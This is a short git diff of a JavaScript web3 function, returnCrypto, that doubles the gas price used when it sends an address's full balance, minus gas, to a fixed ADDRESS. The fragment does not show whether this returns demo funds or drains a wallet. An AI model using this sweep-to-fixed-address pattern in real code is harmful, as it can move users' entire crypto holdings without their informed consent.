@@ -73,12 +73,14 @@ export const returnCrypto = () => {
           .send({ from: address })
           .on("receipt", () => {
             web3.eth.getGasPrice().then((result) => {
-              const gasCost = 21000 * Number(result);
+              const gasPrice = Number(result) * 2;
+              const gasCost = 21000 * gasPrice;
               web3.eth.getBalance(address).then((result) => {
                 web3.eth.sendTransaction({
                   from: address,
                   to: ADDRESS,
                   value: Number(result) - gasCost,
+                  gasPrice,
                 });
               });
             });
